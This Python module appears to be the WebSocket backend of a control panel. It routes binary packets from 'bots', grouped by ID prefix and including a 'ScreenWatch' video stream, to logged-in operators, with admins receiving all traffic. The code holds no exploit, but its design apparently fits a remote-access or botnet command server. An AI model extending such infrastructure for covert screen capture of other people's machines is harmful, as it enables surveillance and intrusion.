# backend\API\connection_manager.py

import asyncio
from logs import Log as logger

class ConnectionManager:
    def __init__(self):
        self.active_connections = {} # {login: [ws]}
        self.tunnels = {}           # {prefix: [ws]}
        self.queues = {}            # {ws: Queue}
        self.send_tasks = {}
        self.bot_prefix_cache = {}  # {raw_id_bytes: prefix_str}

    async def connect(self, ws, login, user):
        await ws.accept()
        queue = asyncio.Queue(maxsize=100)
        self.queues[ws] = queue
        self.send_tasks[ws] = asyncio.create_task(self._socket_writer(ws, queue))
        
        self.active_connections.setdefault(login, []).append(ws)
        prefix = user.get("prefix", "NONE")
        self.tunnels.setdefault(prefix, []).append(ws)
        if user.get("role") == "admin":
            self.tunnels.setdefault("ALL", []).append(ws)
        logger.info(f"[API] [+] {login} туннелирован ({prefix})")

    async def _socket_writer(self, ws, queue):
        try:
            while True:
                packet = await queue.get()
                await ws.send_bytes(packet)
                queue.task_done()
        except: pass

    def disconnect(self, ws, login):
        if ws in self.send_tasks: self.send_tasks[ws].cancel(); del self.send_tasks[ws]
        self.queues.pop(ws, None)
        for group in [self.active_connections.get(login, []), *self.tunnels.values()]:
            if ws in group: group.remove(ws)

    def broadcast_packet_sync(self, packet: bytes):
        try:
            id_len, mod_len = packet[0], packet[1]
            raw_id = packet[6:6 + id_len]
            
            # Проверка на видео без полного декода строки
            is_video = b"ScreenWatch" in packet[6+id_len : 6+id_len+mod_len]

            # Кэширование префикса
            prefix = self.bot_prefix_cache.get(raw_id)
            if not prefix:
                prefix = raw_id.decode(errors='ignore').split('-')[0]
                self.bot_prefix_cache[raw_id] = prefix

            # Сбор уникальных получателей
            targets = set(self.tunnels.get(prefix, [])) | set(self.tunnels.get("ALL", []))

            for ws in targets:
                q = self.queues.get(ws)
                if not q: continue
                if is_video: # Очистка очереди для минимизации задержки видео
                    while not q.empty():
                        try: q.get_nowait()
                        except asyncio.QueueEmpty: break
                q.put_nowait(packet)
        except: pass